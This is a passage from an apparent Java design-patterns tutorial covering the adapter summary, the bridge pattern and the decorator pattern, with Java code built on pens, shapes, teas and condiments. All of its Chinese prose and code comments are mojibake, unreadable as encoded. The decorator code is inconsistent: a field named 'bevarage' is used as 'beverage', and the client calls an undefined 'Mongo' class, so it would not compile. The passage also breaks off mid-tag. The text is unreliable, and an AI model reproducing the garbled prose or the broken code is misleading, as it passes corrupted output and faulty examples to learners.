id="é€‚é…å™¨æ¨¡å¼æ€»ç»“">é€‚é…å™¨æ¨¡å¼æ€»ç»“</span></h4><ol><li><p>ç±»é€‚é…å’Œå¯¹è±¡é€‚é…çš„å¼‚åŒ</p><blockquote><p>ä¸€ä¸ªé‡‡ç”¨ç»§æ‰¿ï¼Œä¸€ä¸ªé‡‡ç”¨ç»„åˆï¼›</p><p>ç±»é€‚é…å±äºé™æ€å®ç°ï¼Œå¯¹è±¡é€‚é…å±äºç»„åˆçš„åŠ¨æ€å®ç°ï¼Œå¯¹è±¡é€‚é…éœ€è¦å¤šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>æ€»ä½“æ¥è¯´ï¼Œå¯¹è±¡é€‚é…ç”¨å¾—æ¯”è¾ƒå¤šã€‚</p></blockquote></li><li><p>é€‚é…å™¨æ¨¡å¼å’Œä»£ç†æ¨¡å¼çš„å¼‚åŒ</p><p>æ¯”è¾ƒè¿™ä¸¤ç§æ¨¡å¼ï¼Œå…¶å®æ˜¯æ¯”è¾ƒå¯¹è±¡é€‚é…å™¨æ¨¡å¼å’Œä»£ç†æ¨¡å¼ï¼Œåœ¨ä»£ç ç»“æ„ä¸Šï¼Œå®ƒä»¬å¾ˆç›¸ä¼¼ï¼Œéƒ½éœ€è¦ä¸€ä¸ªå…·ä½“çš„å®ç°ç±»çš„å®ä¾‹ã€‚ä½†æ˜¯å®ƒä»¬çš„ç›®çš„ä¸ä¸€æ ·ï¼Œä»£ç†æ¨¡å¼åšçš„æ˜¯å¢å¼ºåŸæ–¹æ³•çš„æ´»ï¼›é€‚é…å™¨åšçš„æ˜¯é€‚é…çš„æ´»ï¼Œä¸ºçš„æ˜¯æä¾›â€œæŠŠé¸¡åŒ…è£…æˆé¸­ï¼Œç„¶åå½“åšé¸­æ¥ä½¿ç”¨â€ï¼Œè€Œé¸¡å’Œé¸­å®ƒä»¬ä¹‹é—´åŸæœ¬æ²¡æœ‰ç»§æ‰¿å…³ç³»ã€‚</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-5.png" alt="adapter-5"></p></li></ol><h3><span id="æ¡¥æ¢æ¨¡å¼">æ¡¥æ¢æ¨¡å¼</span></h3><p>ç†è§£æ¡¥æ¢æ¨¡å¼ï¼Œå…¶å®å°±æ˜¯ç†è§£ä»£ç æŠ½è±¡å’Œè§£è€¦ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ä¸€ä¸ªæ¡¥æ¢ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®šä¹‰æä¾›çš„æ¥å£æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DrawAPI</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸€ç³»åˆ—å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedPen</span> <span class="keyword">implements</span> <span class="title class_">DrawAPI</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç”¨çº¢è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreenPen</span> <span class="keyword">implements</span> <span class="title class_">DrawAPI</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç”¨ç»¿è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BluePen</span> <span class="keyword">implements</span> <span class="title class_">DrawAPI</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç”¨è“è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ­¤ç±»çš„å®ç°ç±»éƒ½éœ€è¦ä½¿ç”¨ DrawAPIï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> DrawAPI drawAPI;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">Shape</span><span class="params">(DrawAPI drawAPI)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.drawAPI = drawAPI;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰æŠ½è±¡ç±»çš„å­ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ†å½¢</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> radius;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Circle</span><span class="params">(<span class="type">int</span> radius, DrawAPI drawAPI)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(drawAPI);</span><br><span class="line">        <span class="built_in">this</span>.radius = radius;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        drawAPI.draw(radius, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é•¿æ–¹å½¢</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> y;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, DrawAPI drawAPI)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(drawAPI);</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        drawAPI.draw(<span class="number">0</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬æ¥çœ‹å®¢æˆ·ç«¯æ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Shape</span> <span class="variable">greenCircle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">10</span>, <span class="keyword">new</span> <span class="title class_">GreenPen</span>());</span><br><span class="line">    <span class="type">Shape</span> <span class="variable">redRectangle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>(<span class="number">4</span>, <span class="number">8</span>, <span class="keyword">new</span> <span class="title class_">RedPen</span>());</span><br><span class="line">    greenCircle.draw();</span><br><span class="line">    redRectangle.draw();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯èƒ½å¤§å®¶çœ‹ä¸Šé¢ä¸€æ­¥æ­¥è¿˜ä¸æ˜¯ç‰¹åˆ«æ¸…æ™°ï¼Œæˆ‘æŠŠæ‰€æœ‰çš„ä¸œè¥¿æ•´åˆåˆ°ä¸€å¼ å›¾ä¸Šï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/bridge-1.png" alt="bridge-1"></p><p>è¿™å›å¤§å®¶åº”è¯¥å°±çŸ¥é“æŠ½è±¡åœ¨å“ªé‡Œï¼Œæ€ä¹ˆè§£è€¦äº†å§ã€‚æ¡¥æ¢æ¨¡å¼çš„ä¼˜ç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå°±æ˜¯éå¸¸å®¹æ˜“è¿›è¡Œæ‰©å±•ã€‚</p><blockquote><p>æœ¬èŠ‚å¼•ç”¨äº†<a href="https://www.tutorialspoint.com/design_pattern/bridge_pattern.htm">è¿™é‡Œ</a>çš„ä¾‹å­ï¼Œå¹¶å¯¹å…¶è¿›è¡Œäº†ä¿®æ”¹ã€‚</p></blockquote><h3><span id="è£…é¥°æ¨¡å¼">è£…é¥°æ¨¡å¼</span></h3><p>è¦æŠŠè£…é¥°æ¨¡å¼è¯´æ¸…æ¥šæ˜ç™½ï¼Œä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚ä¹Ÿè®¸è¯»è€…çŸ¥é“ <strong>Java IO</strong> ä¸­çš„å‡ ä¸ªç±»æ˜¯å…¸å‹çš„è£…é¥°æ¨¡å¼çš„åº”ç”¨ï¼Œä½†æ˜¯è¯»è€…ä¸ä¸€å®šæ¸…æ¥šå…¶ä¸­çš„å…³ç³»ï¼Œä¹Ÿè®¸çœ‹å®Œå°±å¿˜äº†ï¼Œå¸Œæœ›çœ‹å®Œè¿™èŠ‚åï¼Œè¯»è€…å¯ä»¥å¯¹å…¶æœ‰æ›´æ·±çš„æ„Ÿæ‚Ÿã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç®€å•çš„å›¾ï¼Œçœ‹è¿™ä¸ªå›¾çš„æ—¶å€™ï¼Œäº†è§£ä¸‹å±‚æ¬¡ç»“æ„å°±å¯ä»¥äº†ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/decorator-1.png" alt="decorator-1"></p><p>æˆ‘ä»¬æ¥è¯´è¯´è£…é¥°æ¨¡å¼çš„å‡ºå‘ç‚¹ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ¥å£ <code>Component</code> å…¶å®å·²ç»æœ‰äº† <code>ConcreteComponentA</code> å’Œ <code>ConcreteComponentB</code> ä¸¤ä¸ªå®ç°ç±»äº†ï¼Œä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¦<strong>å¢å¼º</strong>è¿™ä¸¤ä¸ªå®ç°ç±»çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é‡‡ç”¨è£…é¥°æ¨¡å¼ï¼Œç”¨å…·ä½“çš„è£…é¥°å™¨æ¥<strong>è£…é¥°</strong>å®ç°ç±»ï¼Œä»¥è¾¾åˆ°å¢å¼ºçš„ç›®çš„ã€‚</p><blockquote><p>ä»åå­—æ¥ç®€å•è§£é‡Šä¸‹è£…é¥°å™¨ã€‚æ—¢ç„¶è¯´æ˜¯è£…é¥°ï¼Œé‚£ä¹ˆå¾€å¾€å°±æ˜¯<strong>æ·»åŠ å°åŠŸèƒ½</strong>è¿™ç§ï¼Œè€Œä¸”ï¼Œæˆ‘ä»¬è¦æ»¡è¶³å¯ä»¥æ·»åŠ å¤šä¸ªå°åŠŸèƒ½ã€‚æœ€ç®€å•çš„ï¼Œä»£ç†æ¨¡å¼å°±å¯ä»¥å®ç°åŠŸèƒ½çš„å¢å¼ºï¼Œä½†æ˜¯ä»£ç†ä¸å®¹æ˜“å®ç°å¤šä¸ªåŠŸèƒ½çš„å¢å¼ºï¼Œå½“ç„¶ä½ å¯ä»¥è¯´ç”¨ä»£ç†åŒ…è£…ä»£ç†çš„å¤šå±‚åŒ…è£…æ–¹å¼ï¼Œä½†æ˜¯é‚£æ ·çš„è¯ä»£ç å°±å¤æ‚äº†ã€‚</p></blockquote><p>é¦–å…ˆæ˜ç™½ä¸€äº›ç®€å•çš„æ¦‚å¿µï¼Œä»å›¾ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œæ‰€æœ‰çš„å…·ä½“è£…é¥°è€…ä»¬ <strong>ConcreteDecorator</strong>* éƒ½å¯ä»¥ä½œä¸º Component æ¥ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬éƒ½å®ç°äº† Component ä¸­çš„æ‰€æœ‰æ¥å£ã€‚å®ƒä»¬å’Œ Component å®ç°ç±» ConcreteComponent* çš„åŒºåˆ«æ˜¯ï¼Œå®ƒä»¬åªæ˜¯è£…é¥°è€…ï¼Œèµ·<strong>è£…é¥°</strong>ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯å³ä½¿å®ƒä»¬çœ‹ä¸Šå»ç‰›é€¼è½°è½°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½åªæ˜¯åœ¨å…·ä½“çš„å®ç°ä¸­<strong>åŠ äº†å±‚çš®æ¥è£…é¥°</strong>è€Œå·²ã€‚</p><blockquote><p>æ³¨æ„è¿™æ®µè¯ä¸­æ··æ‚åœ¨å„ä¸ªåè¯ä¸­çš„ Component å’Œ Decoratorï¼Œåˆ«ææ··äº†ã€‚</p></blockquote><p>ä¸‹é¢æ¥çœ‹çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå…ˆæŠŠè£…é¥°æ¨¡å¼å¼„æ¸…æ¥šï¼Œç„¶åå†ä»‹ç»ä¸‹ java io ä¸­çš„è£…é¥°æ¨¡å¼çš„åº”ç”¨ã€‚</p><p>æœ€è¿‘å¤§è¡—ä¸Šæµè¡Œèµ·æ¥äº†â€œå¿«ä¹æŸ æª¬â€ï¼Œæˆ‘ä»¬æŠŠå¿«ä¹æŸ æª¬çš„é¥®æ–™åˆ†ä¸ºä¸‰ç±»ï¼šçº¢èŒ¶ã€ç»¿èŒ¶ã€å’–å•¡ï¼Œåœ¨è¿™ä¸‰å¤§ç±»çš„åŸºç¡€ä¸Šï¼Œåˆå¢åŠ äº†è®¸å¤šçš„å£å‘³ï¼Œä»€ä¹ˆé‡‘æ¡”æŸ æª¬çº¢èŒ¶ã€é‡‘æ¡”æŸ æª¬çç ç»¿èŒ¶ã€èŠ’æœçº¢èŒ¶ã€èŠ’æœç»¿èŒ¶ã€èŠ’æœçç çº¢èŒ¶ã€çƒ¤çç çº¢èŒ¶ã€çƒ¤çç èŠ’æœç»¿èŒ¶ã€æ¤°é¦™èƒšèŠ½å’–å•¡ã€ç„¦ç³–å¯å¯å’–å•¡ç­‰ç­‰ï¼Œæ¯å®¶åº—éƒ½æœ‰å¾ˆé•¿çš„èœå•ï¼Œä½†æ˜¯ä»”ç»†çœ‹ä¸‹ï¼Œå…¶å®åŸæ–™ä¹Ÿæ²¡å‡ æ ·ï¼Œä½†æ˜¯å¯ä»¥æ­é…å‡ºå¾ˆå¤šç»„åˆï¼Œå¦‚æœé¡¾å®¢éœ€è¦ï¼Œå¾ˆå¤šæ²¡å‡ºç°åœ¨èœå•ä¸­çš„é¥®æ–™ä»–ä»¬ä¹Ÿæ˜¯å¯ä»¥åšçš„ã€‚</p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œçº¢èŒ¶ã€ç»¿èŒ¶ã€å’–å•¡æ˜¯æœ€åŸºç¡€çš„é¥®æ–™ï¼Œå…¶ä»–çš„åƒé‡‘æ¡”æŸ æª¬ã€èŠ’æœã€çç ã€æ¤°æœã€ç„¦ç³–ç­‰éƒ½å±äºè£…é¥°ç”¨çš„ã€‚å½“ç„¶ï¼Œåœ¨å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç¡®å®å¯ä»¥åƒé—¨åº—ä¸€æ ·ï¼Œå¼€å‘è¿™äº›ç±»ï¼šLemonBlackTeaã€LemonGreenTeaã€MangoBlackTeaã€MangoLemonGreenTeaâ€¦â€¦ä½†æ˜¯ï¼Œå¾ˆå¿«æˆ‘ä»¬å°±å‘ç°ï¼Œè¿™æ ·å­å¹²è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬éœ€è¦ç»„åˆå‡ºæ‰€æœ‰çš„å¯èƒ½ï¼Œè€Œä¸”å¦‚æœå®¢äººéœ€è¦åœ¨çº¢èŒ¶ä¸­åŠ åŒä»½æŸ æª¬æ€ä¹ˆåŠï¼Ÿä¸‰ä»½æŸ æª¬æ€ä¹ˆåŠï¼Ÿ</p><p>ä¸è¯´åºŸè¯äº†ï¼Œä¸Šä»£ç ã€‚</p><p>é¦–å…ˆï¼Œå®šä¹‰é¥®æ–™æŠ½è±¡åŸºç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Beverage</span> &#123;</span><br><span class="line">  <span class="comment">// è¿”å›æè¿°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getDescription</span><span class="params">()</span>;</span><br><span class="line">  <span class="comment">// è¿”å›ä»·æ ¼</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸‰ä¸ªåŸºç¡€é¥®æ–™å®ç°ç±»ï¼Œçº¢èŒ¶ã€ç»¿èŒ¶å’Œå’–å•¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackTea</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;çº¢èŒ¶&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreenTea</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ç»¿èŒ¶&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...<span class="comment">// å’–å•¡çœç•¥</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰è°ƒæ–™ï¼Œä¹Ÿå°±æ˜¯è£…é¥°è€…çš„åŸºç±»ï¼Œæ­¤ç±»å¿…é¡»ç»§æ‰¿è‡ª Beverageï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è°ƒæ–™</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Condiment</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ¥å®šä¹‰æŸ æª¬ã€èŠ’æœç­‰å…·ä½“çš„è°ƒæ–™ï¼Œå®ƒä»¬å±äºè£…é¥°è€…ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¿™äº›è°ƒæ–™è‚¯å®šéƒ½éœ€è¦ç»§æ‰¿è°ƒæ–™ Condiment ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lemon</span> <span class="keyword">extends</span> <span class="title class_">Condiment</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Beverage bevarage;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå¾ˆå…³é”®ï¼Œéœ€è¦ä¼ å…¥å…·ä½“çš„é¥®æ–™ï¼Œå¦‚éœ€è¦ä¼ å…¥æ²¡æœ‰è¢«è£…é¥°çš„çº¢èŒ¶æˆ–ç»¿èŒ¶ï¼Œ</span></span><br><span class="line">    <span class="comment">// å½“ç„¶ä¹Ÿå¯ä»¥ä¼ å…¥å·²ç»è£…é¥°å¥½çš„èŠ’æœç»¿èŒ¶ï¼Œè¿™æ ·å¯ä»¥åšèŠ’æœæŸ æª¬ç»¿èŒ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Lemon</span><span class="params">(Beverage bevarage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bevarage = bevarage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è£…é¥°</span></span><br><span class="line">        <span class="keyword">return</span> bevarage.getDescription() + <span class="string">&quot;, åŠ æŸ æª¬&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è£…é¥°</span></span><br><span class="line">        <span class="keyword">return</span> beverage.cost() + <span class="number">2</span>; <span class="comment">// åŠ æŸ æª¬éœ€è¦ 2 å…ƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mango</span> <span class="keyword">extends</span> <span class="title class_">Condiment</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Beverage bevarage;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mango</span><span class="params">(Beverage bevarage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.bevarage = bevarage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bevarage.getDescription() + <span class="string">&quot;, åŠ èŠ’æœ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">cost</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> beverage.cost() + <span class="number">3</span>; <span class="comment">// åŠ èŠ’æœéœ€è¦ 3 å…ƒ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...<span class="comment">// ç»™æ¯ä¸€ç§è°ƒæ–™éƒ½åŠ ä¸€ä¸ªç±»</span></span><br></pre></td></tr></table></figure><p>çœ‹å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸºç¡€é¥®æ–™ï¼Œçº¢èŒ¶ã€ç»¿èŒ¶æˆ–å’–å•¡</span></span><br><span class="line">    <span class="type">Beverage</span> <span class="variable">beverage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GreenTea</span>();</span><br><span class="line">    <span class="comment">// å¼€å§‹è£…é¥°</span></span><br><span class="line">    beverage = <span class="keyword">new</span> <span class="title class_">Lemon</span>(beverage); <span class="comment">// å…ˆåŠ ä¸€ä»½æŸ æª¬</span></span><br><span class="line">    beverage = <span class="keyword">new</span> <span class="title class_">Mongo</span>(beverage); <span class="comment">// å†åŠ ä¸€ä»½èŠ’æœ</span></span><br><span class="line"></span><br><span class="line">    System.out.println(beverage.getDescription() + <span class="string">&quot; ä»·æ ¼ï¼šï¿¥&quot;</span> + beverage.cost());</span><br><span class="line">    <span class="comment">//&quot;ç»¿èŒ¶, åŠ æŸ æª¬, åŠ èŠ’æœ ä»·æ ¼ï¼šï¿¥16&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬éœ€è¦ <strong>èŠ’æœ-çç -åŒä»½æŸ æª¬-çº¢èŒ¶</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Beverage</span> <span class="variable">beverage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mongo</span>(<span class="keyword">new</span> <span class="title class_">Pearl</span>(<span class="keyword">new</span> <span class="title class_">Lemon</span>(<span class="keyword">new</span> <span class="title class_">Lemon</span>(<span class="keyword">new</span> <span class="title class_">BlackTea</span>()))));</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯å¾ˆå˜æ€ï¼Ÿ</p><p>çœ‹çœ‹ä¸‹å›¾å¯èƒ½ä¼šæ¸…æ™°ä¸€äº›ï¼š</p><p><img 